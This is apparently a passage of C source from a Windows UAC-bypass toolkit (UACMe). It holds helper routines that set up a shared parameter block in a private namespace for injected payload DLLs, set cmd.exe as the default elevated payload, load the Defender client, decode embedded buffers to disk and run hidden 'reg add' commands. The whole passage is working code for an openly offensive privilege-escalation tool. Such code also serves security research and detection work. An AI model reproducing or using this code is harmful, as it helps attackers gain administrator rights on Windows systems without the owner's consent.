        sizeof(PROCESS_MITIGATION_IMAGE_LOAD_POLICY_W10),
        &Policies->ImageLoadPolicy);

    supGetProcessMitigationPolicy(
        hProcess,
        (PROCESS_MITIGATION_POLICY)ProcessSystemCallFilterPolicy,
        sizeof(PROCESS_MITIGATION_SYSTEM_CALL_FILTER_POLICY_W10),
        &Policies->SystemCallFilterPolicy);

    supGetProcessMitigationPolicy(
        hProcess,
        (PROCESS_MITIGATION_POLICY)ProcessPayloadRestrictionPolicy,
        sizeof(PROCESS_MITIGATION_PAYLOAD_RESTRICTION_POLICY_W10),
        &Policies->PayloadRestrictionPolicy);

    return Policies;
}

/*
* supCreateDirectory
*
* Purpose:
*
* Native create directory.
*
*/
NTSTATUS supCreateDirectory(
    _Out_opt_ PHANDLE phDirectory,
    _In_ OBJECT_ATTRIBUTES *ObjectAttributes,
    _In_ ULONG DirectoryShareFlags,
    _In_ ULONG DirectoryAttributes
)
{
    NTSTATUS         status;
    HANDLE           DirectoryHandle = NULL;
    IO_STATUS_BLOCK  IoStatusBlock;

    if (DirectoryAttributes == 0)
        DirectoryAttributes = FILE_ATTRIBUTE_NORMAL;

    status = NtCreateFile(
        &DirectoryHandle,
        FILE_GENERIC_WRITE,
        ObjectAttributes,
        &IoStatusBlock,
        NULL,
        DirectoryAttributes,
        DirectoryShareFlags,
        FILE_OPEN_IF,
        FILE_DIRECTORY_FILE,
        NULL,
        0);

    if (NT_SUCCESS(status)) {
        if (phDirectory)
            *phDirectory = DirectoryHandle;
    }
    return status;
}

/*
* supxCreateBoundaryDescriptorSID
*
* Purpose:
*
* Create special SID to access isolated namespace.
*
*/
PSID supxCreateBoundaryDescriptorSID(
    SID_IDENTIFIER_AUTHORITY *SidAuthority,
    UCHAR SubAuthorityCount,
    ULONG *SubAuthorities
)
{
    BOOL    bCond = FALSE, bResult = FALSE;
    ULONG   i;
    PSID    pSid = NULL;

    do {

        pSid = supHeapAlloc(RtlLengthRequiredSid(SubAuthorityCount));
        if (pSid == NULL)
            break;

        if (!NT_SUCCESS(RtlInitializeSid(pSid, SidAuthority, SubAuthorityCount)))
            break;

        for (i = 0; i < SubAuthorityCount; i++)
            *RtlSubAuthoritySid(pSid, i) = SubAuthorities[i];

        bResult = TRUE;

    } while (bCond);

    if (bResult == FALSE) {
        if (pSid) supHeapFree(pSid);
        pSid = NULL;
    }

    return pSid;
}

/*
* supCreateSharedParametersBlock
*
* Purpose:
*
* Create parameters block to be shared with payload dlls.
*
*/
BOOL supCreateSharedParametersBlock(
    _In_ PVOID ucmContext)
{
    BOOL    bCond = FALSE, bResult = FALSE;
    ULONG   r;
    HANDLE  hBoundary = NULL;
    PVOID   SharedBuffer = NULL;
    SIZE_T  ViewSize;

    PUACMECONTEXT context = (PUACMECONTEXT)ucmContext;

    LARGE_INTEGER liSectionSize;
    PSID pWorldSid = NULL;

    SID_IDENTIFIER_AUTHORITY SidWorldAuthority = SECURITY_WORLD_SID_AUTHORITY;

    UNICODE_STRING usName = RTL_CONSTANT_STRING(BDESCRIPTOR_NAME);
    OBJECT_ATTRIBUTES obja = RTL_INIT_OBJECT_ATTRIBUTES((PUNICODE_STRING)NULL, 0);

    UACME_PARAM_BLOCK ParamBlock;

    ULONG SubAuthoritiesWorld[] = { SECURITY_WORLD_RID };

    //
    // Fill parameters block.
    // 
    RtlSecureZeroMemory(&ParamBlock, sizeof(ParamBlock));

    if (context->OptionalParameterLength != 0) {
        _strncpy(ParamBlock.szParameter, MAX_PATH,
            context->szOptionalParameter, MAX_PATH);
    }

    _strcpy(ParamBlock.szSignalObject, AKAGI_COMPLETION_EVENT);

    ParamBlock.AkagiFlag = context->AkagiFlag;
    ParamBlock.SessionId = NtCurrentPeb()->SessionId;

    supWinstationToName(NULL, ParamBlock.szWinstation, MAX_PATH * 2, &r);
    supDesktopToName(NULL, ParamBlock.szDesktop, MAX_PATH * 2, &r);

    ParamBlock.Crc32 = RtlComputeCrc32(0, &ParamBlock, sizeof(ParamBlock));

    do {
        //
        // Create and assign boundary descriptor.
        //
        hBoundary = RtlCreateBoundaryDescriptor(&usName, 0);
        if (hBoundary == NULL)
            break;

        pWorldSid = supxCreateBoundaryDescriptorSID(
            &SidWorldAuthority,
            1,
            SubAuthoritiesWorld);
        if (pWorldSid == NULL)
            break;

        if (!NT_SUCCESS(RtlAddSIDToBoundaryDescriptor(&hBoundary, pWorldSid))) {
            break;
        }

        //
        // Create private namespace.
        //
        if (!NT_SUCCESS(NtCreatePrivateNamespace(
            &context->SharedContext.hIsolatedNamespace,
            MAXIMUM_ALLOWED,
            &obja,
            hBoundary)))
        {
            break;
        }

        obja.Attributes = OBJ_CASE_INSENSITIVE;
        obja.RootDirectory = context->SharedContext.hIsolatedNamespace;
        obja.ObjectName = &usName;

        //
        // Create completion event.
        //
        RtlInitUnicodeString(&usName, AKAGI_COMPLETION_EVENT);
        if (!NT_SUCCESS(NtCreateEvent(
            &context->SharedContext.hCompletionEvent,
            EVENT_ALL_ACCESS,
            &obja,
            NotificationEvent,
            FALSE)))
        {
            break;
        }

        //
        // Create shared section.
        //
        liSectionSize.QuadPart = PAGE_SIZE;
        ViewSize = PAGE_SIZE;

        RtlInitUnicodeString(&usName, AKAGI_SHARED_SECTION);
        if (NT_SUCCESS(NtCreateSection(
            &context->SharedContext.hSharedSection,
            SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_QUERY,
            &obja,
            &liSectionSize,
            PAGE_READWRITE,
            SEC_COMMIT,
            NULL)))
        {
            //
            // Write data to shared section.
            //
            if (NT_SUCCESS(NtMapViewOfSection(
                context->SharedContext.hSharedSection,
                NtCurrentProcess(),
                &SharedBuffer,
                0,
                PAGE_SIZE,
                NULL,
                &ViewSize,
                ViewUnmap,
                MEM_TOP_DOWN,
                PAGE_READWRITE)))
            {
                RtlSecureZeroMemory(SharedBuffer, PAGE_SIZE);
                RtlCopyMemory(SharedBuffer, &ParamBlock, sizeof(ParamBlock));
                NtUnmapViewOfSection(NtCurrentProcess(), SharedBuffer);
                bResult = TRUE;
            }
        }


    } while (bCond);

    //
    // Cleanup.
    //
    if (pWorldSid)
        supHeapFree(pWorldSid);
    if (hBoundary)
        RtlDeleteBoundaryDescriptor(hBoundary);

    if (bResult == FALSE) {
        if (context->SharedContext.hIsolatedNamespace) {
            NtDeletePrivateNamespace(context->SharedContext.hIsolatedNamespace);
            NtClose(context->SharedContext.hIsolatedNamespace);
        }
    }

    return bResult;
}

/*
* supDestroySharedParametersBlock
*
* Purpose:
*
* Free shared resources.
*
*/
VOID supDestroySharedParametersBlock(
    _In_ PVOID ucmContext)
{
    PUACMECONTEXT context = (PUACMECONTEXT)ucmContext;

    if (context->SharedContext.hIsolatedNamespace) {

        if (context->SharedContext.hCompletionEvent)
            NtClose(context->SharedContext.hCompletionEvent);

        if (context->SharedContext.hSharedSection)
            NtClose(context->SharedContext.hSharedSection);

        NtDeletePrivateNamespace(context->SharedContext.hIsolatedNamespace);
        NtClose(context->SharedContext.hIsolatedNamespace);
    }
}

/*
* supCreateUacmeContext
*
* Purpose:
*
* Allocate and fill program contexts.
*
*/
PVOID supCreateUacmeContext(
    _In_ ULONG Method,
    _In_reads_or_z_opt_(OptionalParameterLength) LPWSTR OptionalParameter,
    _In_ ULONG OptionalParameterLength,
    _In_ PVOID DecompressRoutine,
    _In_ BOOL OutputToDebugger
)
{
    BOOL IsWow64;
#ifdef _DEBUG
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
#endif
    ULONG Seed, NtBuildNumber = 0;
    SIZE_T Size = sizeof(UACMECONTEXT);
    PUACMECONTEXT Context;

    RTL_OSVERSIONINFOW osv;

    if (OptionalParameterLength > MAX_PATH)
        return NULL;

    IsWow64 = supIsProcess32bit(NtCurrentProcess());

    if (IsWow64) {
        RtlSecureZeroMemory(&osv, sizeof(osv));
        osv.dwOSVersionInfoSize = sizeof(osv);
        RtlGetVersion((PRTL_OSVERSIONINFOW)&osv);
        NtBuildNumber = osv.dwBuildNumber;

    }
    else {
        if (!supQueryNtBuildNumber(&NtBuildNumber)) {
            return NULL;
        }
    }

    if (NtBuildNumber < 7000) {
        return NULL;
    }

    Context = supVirtualAlloc(&Size,
        DEFAULT_ALLOCATION_TYPE,
        DEFAULT_PROTECT_TYPE,
        NULL);

    if (Context == NULL) {
        return NULL;
    }

    //
    // Create private heap, enable termination on corruption.
    //
    Context->ucmHeap = RtlCreateHeap(HEAP_GROWABLE, NULL, 0, 0, NULL, NULL);
    if (Context->ucmHeap == NULL) {
        supVirtualFree(Context, NULL);
        return NULL;
    }
    RtlSetHeapInformation(Context->ucmHeap, HeapEnableTerminationOnCorruption, NULL, 0);

    //
    // Set Fubuki flag.
    //
    if (Method == UacMethodSXS)
        Context->AkagiFlag = AKAGI_FLAG_TANGO;
    else
        Context->AkagiFlag = AKAGI_FLAG_KILO;

    //
    // Remember flag for ucmShow* routines.
    //
    Context->OutputToDebugger = OutputToDebugger;

    //
    // Remember NtBuildNumber.
    //
    Context->dwBuildNumber = NtBuildNumber;

    //
    // Set Cookie for supEncode/DecodePointer.
    //
    Seed = USER_SHARED_DATA->Cookie;
    Context->Cookie = RtlRandomEx((PULONG)&Seed);

    //
    // Remember Wow64 process state.
    //
    Context->IsWow64 = IsWow64;

    //
    // Load mpclient.
    //
    if (NtBuildNumber > 7601) {
#ifdef _DEBUG
        Context->hMpClient = wdLoadClient(IsWow64, &Status);
        if (!NT_SUCCESS(Status)) {
            supDebugPrint(L"wdLoadClient", Status);
        }
#else
        Context->hMpClient = (HINSTANCE)wdLoadClient(IsWow64, NULL);
#endif
    }

    //
    // Save OptionalParameter if present.
    //
    if (OptionalParameterLength) {
        _strncpy(Context->szOptionalParameter, MAX_PATH,
            OptionalParameter, OptionalParameterLength);
        Context->OptionalParameterLength = OptionalParameterLength;
    }

    //
    // Remember dll handles.
    //
    Context->hKernel32 = GetModuleHandle(KERNEL32_DLL);
    Context->hShell32 = GetModuleHandle(SHELL32_DLL);
    Context->hNtdll = GetModuleHandle(NTDLL_DLL);

    //
    // Set IFileOperations flags.
    //
    if (NtBuildNumber > 14997) {
        Context->IFileOperationFlags = FOF_NOCONFIRMATION |
            FOFX_NOCOPYHOOKS |
            FOFX_REQUIREELEVATION;
    }
    else {
        Context->IFileOperationFlags = FOF_NOCONFIRMATION |
            FOF_SILENT |
            FOFX_SHOWELEVATIONPROMPT |
            FOFX_NOCOPYHOOKS |
            FOFX_REQUIREELEVATION;
    }

    //
    // Query basic directories.
    //       
    // 1. SystemRoot
    // 2. System32
    if (!supQuerySystemRoot(Context)) {
        RtlDestroyHeap(Context->ucmHeap);
        supVirtualFree((PVOID)Context, NULL);
        return NULL;
    }
    // 3. Temp
    supExpandEnvironmentStrings(L"%temp%\\", Context->szTempDirectory, MAX_PATH);

    //
    // Default payload path.
    //
    _strcpy(Context->szDefaultPayload, Context->szSystemDirectory);
    _strcat(Context->szDefaultPayload, CMD_EXE);

    Context->DecompressRoutine = (pfnDecompressPayload)DecompressRoutine;

    return (PVOID)Context;
}

/*
* supDestroyUacmeContext
*
* Purpose:
*
* Destroy program contexts.
*
*/
VOID supDestroyUacmeContext(
    _In_ PVOID Context
)
{
    PUACMECONTEXT context = (PUACMECONTEXT)Context;

    RtlDestroyHeap(context->ucmHeap);

    supVirtualFree(Context, NULL);
}

/*
* supDecodeAndWriteBufferToFile
*
* Purpose:
*
* Create new file and write decoded buffer to it.
*
*/
BOOL supDecodeAndWriteBufferToFile(
    _In_ LPWSTR lpFileName,
    _In_ CONST PVOID Buffer,
    _In_ DWORD BufferSize,
    _In_ ULONG Key
)
{
    BOOL bResult;
    PVOID p;
    SIZE_T Size = ALIGN_UP_BY(BufferSize, PAGE_SIZE);

    p = supVirtualAlloc(&Size, DEFAULT_ALLOCATION_TYPE | MEM_TOP_DOWN, DEFAULT_PROTECT_TYPE, NULL);
    if (p) {
        RtlCopyMemory(p, Buffer, BufferSize);

        EncodeBuffer(p, BufferSize, Key);

        bResult = supWriteBufferToFile(lpFileName, p, BufferSize);

        supSecureVirtualFree(p, Size, NULL);

        return bResult;
    }
    return FALSE;
}

/*
* supEnableDisableWow64Redirection
*
* Purpose:
*
* Enable/Disable Wow64 redirection.
*
*/
NTSTATUS supEnableDisableWow64Redirection(
    _In_ BOOL bDisable
)
{
    PVOID OldValue = NULL, Value;

    if (bDisable)
        Value = IntToPtr(TRUE);
    else
        Value = IntToPtr(FALSE);

    return RtlWow64EnableFsRedirectionEx(Value, &OldValue);
}

/*
* supIndirectRegAdd
*
* Purpose:
*
* REG "add" command.
*
*/
BOOLEAN supIndirectRegAdd(
    _In_ WCHAR* pszRootKey,
    _In_ WCHAR* pszKey,
    _In_opt_ WCHAR* pszValue,
    _In_opt_ WCHAR* pszDataType,
    _In_ WCHAR* pszData
)
{
    BOOLEAN bResult = FALSE;
    LPWSTR pszBuffer;
    HANDLE hProcess;
    SIZE_T sz;

    sz = 1 + _strlen(pszRootKey) +
        _strlen(pszKey) +
        _strlen(pszData);

    if (pszDataType) sz += _strlen(pszDataType);
    if (pszValue) sz += _strlen(pszValue);

    pszBuffer = (PWSTR)supHeapAlloc((MAX_PATH * 4) + (sz * sizeof(WCHAR)));
    if (pszBuffer == NULL)
        return FALSE;

    _strcpy(pszBuffer, g_ctx->szSystemDirectory);
    _strcat(pszBuffer, REG_EXE);
    _strcat(pszBuffer, TEXT(" add "));
    _strcat(pszBuffer, pszRootKey);
    _strcat(pszBuffer, TEXT("\\"));
    _strcat(pszBuffer, pszKey);

    if (pszValue) {
        _strcat(pszBuffer, TEXT(" /v \""));
        _strcat(pszBuffer, pszValue);
        _strcat(pszBuffer, TEXT("\""));
    }

    if (pszDataType) {
        _strcat(pszBuffer, TEXT(" /t "));
        _strcat(pszBuffer, pszDataType);
    }

    _strcat(pszBuffer, TEXT(" /d \""));
    _strcat(pszBuffer, pszData);
    _strcat(pszBuffer, TEXT("\" /f"));

    hProcess = supRunProcessIndirect(
        pszBuffer,
        NULL,
        NULL,
        0,
        SW_HIDE,
        NULL);

    if (hProcess) {
        if (WaitForSingleObject(hProcess, 5000) == WAIT_TIMEOUT)
            TerminateProcess(hProcess, 0);
        CloseHandle(hProcess);
        bResult = TRUE;
    }

    supHeapFree(pszBuffer);

    return bResult;
}
